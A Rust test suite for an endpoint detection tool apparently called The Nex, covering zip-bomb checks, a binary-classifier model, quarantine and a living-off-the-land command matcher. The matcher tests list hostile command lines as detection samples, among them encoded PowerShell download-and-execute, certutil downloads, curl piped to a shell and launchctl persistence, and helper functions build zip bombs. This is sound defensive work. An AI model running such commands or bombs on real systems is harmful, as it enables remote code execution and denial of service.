//! The Nex EDR suite through the core library's public API. Every threat is a harmless synthetic
//! decoy created inside a per-test temporary directory that is removed on drop.

use std::fs;
use std::io::{Cursor, Write};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};

use the_nex_core::bin_ai::{self, BinaryAiScanner, FeatureVector};
use the_nex_core::config::{
    AppConfig, Engine, LiveToggles, RuntimeToggles, ZipLimits, AI_MALWARE_THRESHOLD,
};
use the_nex_core::engine::{classify_file, FileKind};
use the_nex_core::platform;
use the_nex_core::process_guard::{
    check_lotl_command, match_lotl, match_lotl_macos, CURL_PIPE_SHELL,
};
use the_nex_core::quarantine::{self, QuarantineMeta};
use the_nex_core::zip_bomb::{self, ZipThreatKind};
use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipWriter};

static COUNTER: AtomicUsize = AtomicUsize::new(0);

struct TempDir(PathBuf);

impl TempDir {
    fn new(tag: &str) -> Self {
        let path = std::env::temp_dir().join(format!(
            "thenex-suite-{tag}-{}-{}",
            std::process::id(),
            COUNTER.fetch_add(1, Ordering::SeqCst)
        ));
        let _ = fs::remove_dir_all(&path);
        fs::create_dir_all(&path).unwrap();
        Self(path)
    }

    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn config_in(dir: &TempDir) -> AppConfig {
    let cfg = AppConfig::for_base_dir(&dir.path().join("TheNex"));
    cfg.ensure_dirs().unwrap();
    cfg
}

fn build_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut cursor = Cursor::new(Vec::new());
    {
        let mut writer = ZipWriter::new(&mut cursor);
        for (name, data) in files {
            let options =
                SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
            writer.start_file(*name, options).unwrap();
            writer.write_all(data).unwrap();
        }
        writer.finish().unwrap();
    }
    cursor.into_inner()
}

/// `levels` archives in total: the outermost one plus `levels - 1` nested `.zip` entries.
fn nested_zip(levels: usize) -> Vec<u8> {
    let mut current = build_zip(&[("payload.txt", b"nested payload".as_slice())]);
    for level in (2..=levels).rev() {
        let name = format!("level{level}.zip");
        current = build_zip(&[(name.as_str(), current.as_slice())]);
    }
    current
}

fn crc32(data: &[u8]) -> u32 {
    let mut crc = 0xFFFF_FFFFu32;
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}

/// Raw-crafted valid ZIP whose central directory points three entries at one local file's data.
fn overlapping_zip() -> Vec<u8> {
    let data = vec![b'Z'; 64 * 1024];
    let crc = crc32(&data);
    let size = data.len() as u32;
    let local_name = b"kernel.bin";
    let mut out = Vec::new();
    out.extend_from_slice(&0x0403_4b50u32.to_le_bytes());
    out.extend_from_slice(&20u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0x21u16.to_le_bytes());
    out.extend_from_slice(&crc.to_le_bytes());
    out.extend_from_slice(&size.to_le_bytes());
    out.extend_from_slice(&size.to_le_bytes());
    out.extend_from_slice(&(local_name.len() as u16).to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(local_name);
    out.extend_from_slice(&data);
    let cd_offset = out.len() as u32;
    let aliases: [&[u8]; 3] = [b"kernel.bin", b"alias-1.bin", b"alias-2.bin"];
    for name in aliases {
        out.extend_from_slice(&0x0201_4b50u32.to_le_bytes());
        out.extend_from_slice(&20u16.to_le_bytes());
        out.extend_from_slice(&20u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0x21u16.to_le_bytes());
        out.extend_from_slice(&crc.to_le_bytes());
        out.extend_from_slice(&size.to_le_bytes());
        out.extend_from_slice(&size.to_le_bytes());
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(name);
    }
    let cd_size = out.len() as u32 - cd_offset;
    out.extend_from_slice(&0x0605_4b50u32.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&(aliases.len() as u16).to_le_bytes());
    out.extend_from_slice(&(aliases.len() as u16).to_le_bytes());
    out.extend_from_slice(&cd_size.to_le_bytes());
    out.extend_from_slice(&cd_offset.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out
}

fn threat_kind(bytes: &[u8], limits: &ZipLimits) -> Option<ZipThreatKind> {
    zip_bomb::inspect_zip_bytes(bytes, limits).map(|threat| threat.kind)
}

fn file_threat_kind(dir: &TempDir, name: &str, bytes: &[u8]) -> Option<ZipThreatKind> {
    let cfg = config_in(dir);
    let path = dir.path().join(name);
    fs::write(&path, bytes).unwrap();
    assert_eq!(classify_file(&path), FileKind::Archive);
    zip_bomb::inspect_zip_file(&path, &cfg).map(|threat| threat.kind)
}

// ---------------------------------------------------------------- zip bombs

#[test]
fn ratio_bomb_is_flagged() {
    let zeros = vec![0u8; 20 * 1024 * 1024];
    let bytes = build_zip(&[("zeros.bin", zeros.as_slice())]);
    assert!(
        bytes.len() < 256 * 1024,
        "deflate should shrink 20 MiB of zeros"
    );
    assert_eq!(
        threat_kind(&bytes, &ZipLimits::default()),
        Some(ZipThreatKind::CompressionRatio)
    );
    let dir = TempDir::new("ratio");
    assert_eq!(
        file_threat_kind(&dir, "ratio_bomb.zip", &bytes),
        Some(ZipThreatKind::CompressionRatio)
    );
}

#[test]
fn recursive_four_level_bomb_is_flagged() {
    let limits = ZipLimits::default();
    assert_eq!(threat_kind(&nested_zip(3), &limits), None);
    let threat = zip_bomb::inspect_zip_bytes(&nested_zip(4), &limits)
        .expect("a 4-level nested archive must be flagged");
    assert_eq!(threat.kind, ZipThreatKind::NestingDepth);
    assert_eq!(threat.depth, 4);
    let dir = TempDir::new("nested");
    assert_eq!(
        file_threat_kind(&dir, "nested_bomb.zip", &nested_zip(4)),
        Some(ZipThreatKind::NestingDepth)
    );
}

#[test]
fn overlapping_header_bomb_is_flagged() {
    let bytes = overlapping_zip();
    assert_eq!(
        threat_kind(&bytes, &ZipLimits::default()),
        Some(ZipThreatKind::OverlappingEntries)
    );
    let dir = TempDir::new("overlap");
    assert_eq!(
        file_threat_kind(&dir, "overlap.zip", &bytes),
        Some(ZipThreatKind::OverlappingEntries)
    );
}

#[test]
fn benign_zip_is_allowed() {
    let text = b"The Nex benign archive\n".repeat(50);
    let bytes = build_zip(&[
        ("readme.txt", text.as_slice()),
        ("data.csv", b"1,2,3\n4,5,6\n".as_slice()),
    ]);
    assert_eq!(threat_kind(&bytes, &ZipLimits::default()), None);
    let dir = TempDir::new("benign");
    assert_eq!(file_threat_kind(&dir, "benign.zip", &bytes), None);
}

#[test]
fn partial_browser_downloads_are_ignored() {
    let dir = TempDir::new("partial");
    for name in ["setup.zip.crdownload", "movie.part", "cache.tmp"] {
        let path = dir.path().join(name);
        fs::write(&path, build_zip(&[("x", b"x".as_slice())])).unwrap();
        assert!(zip_bomb::is_ignored_extension(&path), "{name}");
        assert!(!zip_bomb::wait_for_file_ready(&path), "{name}");
    }
    let finished = dir.path().join("setup.zip");
    fs::write(&finished, b"done").unwrap();
    assert!(zip_bomb::wait_for_file_ready(&finished));
}

#[test]
fn declared_uncompressed_size_limit_is_enforced() {
    let limits = ZipLimits {
        max_uncompressed_bytes: 64 * 1024,
        ..ZipLimits::default()
    };
    let big = vec![9u8; 128 * 1024];
    let bytes = build_zip(&[("big.bin", big.as_slice())]);
    assert_eq!(
        threat_kind(&bytes, &limits),
        Some(ZipThreatKind::UncompressedSize)
    );
    assert_eq!(
        threat_kind(b"definitely not a zip", &ZipLimits::default()),
        None
    );
}

// ------------------------------------------------------------- local AI

#[test]
fn shannon_entropy_is_accurate() {
    assert_eq!(bin_ai::shannon_entropy(&[]), 0.0);
    assert!(bin_ai::shannon_entropy(&[0u8; 4096]).abs() < 1e-12);
    let two_symbols: Vec<u8> = (0..4096)
        .map(|i| if i % 2 == 0 { 0 } else { 255 })
        .collect();
    assert!((bin_ai::shannon_entropy(&two_symbols) - 1.0).abs() < 1e-12);
    let uniform: Vec<u8> = (0..=255u8).cycle().take(256 * 128).collect();
    assert!((bin_ai::shannon_entropy(&uniform) - 8.0).abs() < 1e-12);
}

#[test]
fn feature_vectors_are_bounded() {
    for features in [
        bin_ai::feature_vector(0, 0.0, 0, 0, 9),
        bin_ai::feature_vector(u64::MAX, 8.0, 10_000, 9, 9),
        bin_ai::feature_vector(1, f64::MAX, 1, 100, 9),
        bin_ai::feature_vector(64 * 1024, 4.0, 4, 3, 7),
    ] {
        assert!(bin_ai::features_in_range(&features), "{features:?}");
    }
    let exe = std::env::current_exe().unwrap();
    let native = bin_ai::extract_features(&fs::read(&exe).unwrap())
        .expect("the test executable is a PE (Windows) or Mach-O (macOS) image");
    assert!(bin_ai::features_in_range(&native), "{native:?}");
    assert!(native[1] > 0.0 && native[2] > 0.0, "{native:?}");
}

/// THENEX_MODEL_PATH makes the model mandatory (CI); otherwise the workspace-root model is used if present.
fn model_path() -> Option<PathBuf> {
    if let Some(path) = std::env::var_os("THENEX_MODEL_PATH") {
        return Some(PathBuf::from(path));
    }
    let local = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .join("thenex_model.onnx");
    local.is_file().then_some(local)
}

#[test]
fn tract_loads_model_and_separates_reference_vectors() {
    let Some(path) = model_path() else {
        eprintln!(
            "thenex_model.onnx not found; run `python scripts/train_onnx.py` to include this test"
        );
        return;
    };
    let scanner = BinaryAiScanner::load(&path);
    assert!(
        scanner.has_model(),
        "tract-onnx could not load {}",
        path.display()
    );
    assert_eq!(scanner.engine_name(), "onnx");

    let malicious: FeatureVector = [1.0, 0.98, 0.1, 0.9];
    let benign: FeatureVector = [3.5, 0.55, 0.3, 0.0];
    let m = scanner.score_features(&malicious);
    let b = scanner.score_features(&benign);
    assert!((0.0..=1.0).contains(&m) && (0.0..=1.0).contains(&b));
    assert!(m > AI_MALWARE_THRESHOLD, "malicious scored {m}");
    assert!(b < AI_MALWARE_THRESHOLD, "benign scored {b}");
    let inference_ran = [malicious, benign]
        .iter()
        .any(|f| (scanner.score_features(f) - bin_ai::heuristic_score(f)).abs() > 1e-4);
    assert!(
        inference_ran,
        "scores equal the heuristic; ONNX inference fell back"
    );
}

#[test]
fn corrupt_and_non_binary_files_fail_gracefully() {
    let junk: [&[u8]; 5] = [
        b"",
        b"MZ",
        b"MZ\x90\x00 truncated portable executable",
        b"\xCF\xFA\xED\xFE truncated mach-o",
        b"\xCA\xFE\xBA\xBE\x00\x00\x00\x09 bogus fat header",
    ];
    for bytes in junk {
        assert_eq!(bin_ai::extract_features(bytes), None, "{bytes:?}");
    }
    let dir = TempDir::new("corrupt");
    let scanner = BinaryAiScanner::heuristic_only();
    let fake = dir.path().join("fake.exe");
    fs::write(&fake, b"MZ this is not really an executable").unwrap();
    assert_eq!(scanner.scan_file(&fake), None);
    assert_eq!(scanner.scan_file(&dir.path().join("missing.exe")), None);
    let missing_model = BinaryAiScanner::load(&dir.path().join("missing.onnx"));
    assert!(!missing_model.has_model());
    let features: FeatureVector = [1.0, 0.98, 0.1, 0.9];
    assert_eq!(
        missing_model.score_features(&features),
        bin_ai::heuristic_score(&features)
    );
}

// ------------------------------------------------------------- LotL matcher

#[test]
fn windows_lotl_commands_are_flagged() {
    for (name, cmdline) in [
        (
            "powershell.exe",
            "powershell.exe -w hidden -enc SQBFAFgAIAAoAEkAVwBSACkA",
        ),
        (
            "powershell.exe",
            "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://x')",
        ),
        (
            "cmd.exe",
            "cmd /c certutil -urlcache -split -f http://x/a.exe a.exe",
        ),
        (
            "certutil.exe",
            "certutil.exe -urlcache -f http://x/a.exe a.exe",
        ),
        ("pwsh.exe", "pwsh -EncodedCommand ZQBjAGgAbwA="),
        ("mshta.exe", "mshta javascript:a=iex (1)"),
    ] {
        assert!(
            check_lotl_command(name, cmdline).is_some(),
            "{name}: {cmdline}"
        );
        assert!(match_lotl(name, cmdline).is_some(), "{name}: {cmdline}");
    }
}

#[test]
fn macos_lotl_commands_are_flagged() {
    for (name, cmdline, expected) in [
        ("sh", "sh -c \"curl http://x | sh\"", CURL_PIPE_SHELL),
        (
            "bash",
            "bash -c 'curl -fsSL https://x/i.sh | sudo bash'",
            CURL_PIPE_SHELL,
        ),
        (
            "osascript",
            "osascript -e 'do shell script \"id\"'",
            "osascript -e",
        ),
        ("sh", "sh -c echo aWQ= | base64 -D | sh", "base64 -d"),
        (
            "zsh",
            "zsh -c launchctl load ~/Library/LaunchAgents/x.plist",
            "launchctl load",
        ),
        (
            "bash",
            "bash -c chmod +x /tmp/x && /tmp/x",
            "chmod +x /tmp/",
        ),
    ] {
        assert_eq!(
            check_lotl_command(name, cmdline),
            Some(expected),
            "{name}: {cmdline}"
        );
        assert_eq!(
            match_lotl_macos(name, cmdline),
            Some(expected),
            "{name}: {cmdline}"
        );
    }
}

#[test]
fn benign_commands_are_allowed() {
    for (name, cmdline) in [
        ("powershell.exe", "powershell.exe -Command Get-Date"),
        ("git.exe", "git status"),
        ("git", "git status"),
        ("cargo.exe", "cargo build"),
        ("cmd.exe", "cmd /c cargo build --release"),
        ("zsh", "zsh -c cargo build"),
        (
            "bash",
            "bash -c curl -s https://x/SHA256SUMS | shasum -a 256 -c",
        ),
        (
            "curl",
            "curl -fsSL -o setup.pkg https://example.com/setup.pkg",
        ),
    ] {
        assert_eq!(check_lotl_command(name, cmdline), None, "{name}: {cmdline}");
    }
}

// ------------------------------------------------------ protected processes

#[test]
fn protected_process_allowlist() {
    for (pid, name) in [
        (0, "System Idle Process"),
        (std::process::id(), "cargo-test"),
        (4242, "the-nex"),
        (4242, "the-nex.exe"),
        (4242, "the-nex-gui"),
        (4242, "explorer.exe"),
        (4242, "svchost.exe"),
        (4242, "launchd"),
        (4242, "WindowServer"),
    ] {
        assert!(platform::is_protected_process(pid, name), "{pid} {name}");
    }
    assert!(!platform::is_protected_process(99999, "malware_sim.exe"));
}

// ------------------------------------------------- quarantine and toggles

#[test]
fn quarantine_meta_restore_and_delete_round_trip() {
    let dir = TempDir::new("quarantine");
    let cfg = config_in(&dir);
    let victim = dir.path().join("Downloads").join("dropper.exe");
    fs::create_dir_all(victim.parent().unwrap()).unwrap();
    let payload: Vec<u8> = (0..70_000u32).map(|i| (i * 31 % 251) as u8).collect();
    fs::write(&victim, &payload).unwrap();
    let expected_sha = quarantine::sha256_hex(&payload);

    let meta = quarantine::quarantine_file(&victim, &cfg, "MALWARE_AI", "suite").unwrap();
    assert!(!victim.exists(), "original must be moved away");
    assert!(meta.quarantined_path.starts_with(&cfg.quarantine_dir));
    assert!(meta
        .quarantined_path
        .to_string_lossy()
        .ends_with("_dropper.exe.quarantined"));
    let stored: QuarantineMeta =
        serde_json::from_slice(&fs::read(quarantine::meta_path(&cfg, &meta.id)).unwrap()).unwrap();
    assert_eq!(stored, meta);
    assert_eq!(stored.sha256, expected_sha);
    assert_eq!(stored.original_path, victim);
    assert_eq!(
        quarantine::list_quarantined(&cfg).unwrap(),
        vec![meta.clone()]
    );

    let restored = quarantine::restore_file(&meta.id, &cfg).unwrap();
    assert_eq!(restored.id, meta.id);
    assert_eq!(
        fs::read(&victim).unwrap(),
        payload,
        "restore must preserve every byte"
    );
    assert!(!quarantine::meta_path(&cfg, &meta.id).exists());

    let again = quarantine::quarantine_file(&victim, &cfg, "MALWARE_AI", "suite").unwrap();
    fs::write(&victim, b"newer file at the same path").unwrap();
    let refused = quarantine::restore_file(&again.id, &cfg).unwrap_err();
    assert_eq!(refused.kind(), std::io::ErrorKind::AlreadyExists);
    fs::remove_file(&victim).unwrap();
    quarantine::delete_quarantined_file(&again.id, &cfg).unwrap();
    assert!(!again.quarantined_path.exists());
    assert!(quarantine::list_quarantined(&cfg).unwrap().is_empty());
    assert!(quarantine::restore_file("..\\..\\escape", &cfg).is_err());
}

#[test]
fn runtime_toggles_round_trip() {
    let dir = TempDir::new("toggles");
    let cfg = config_in(&dir);
    assert_eq!(
        RuntimeToggles::load(&cfg.settings_file).unwrap(),
        RuntimeToggles::default()
    );
    let live = LiveToggles::load(&cfg.settings_file);

    let mut toggles = RuntimeToggles::default();
    toggles.set(Engine::ZipBomb, false);
    toggles.set(Engine::Canary, false);
    toggles.set(Engine::DryRun, true);
    toggles.save(&cfg.settings_file).unwrap();
    assert_eq!(RuntimeToggles::load(&cfg.settings_file).unwrap(), toggles);
    assert_eq!(live.reload_if_changed(&cfg.settings_file), Some(toggles));
    assert!(!live.snapshot().zip_bomb_enabled && live.snapshot().dry_run);

    let reloaded = AppConfig::for_base_dir(&cfg.base_dir);
    assert!(reloaded.is_dry_run());
    assert!(!reloaded.engine_enabled(Engine::Canary));
    assert!(reloaded.engine_enabled(Engine::BinAi));
}
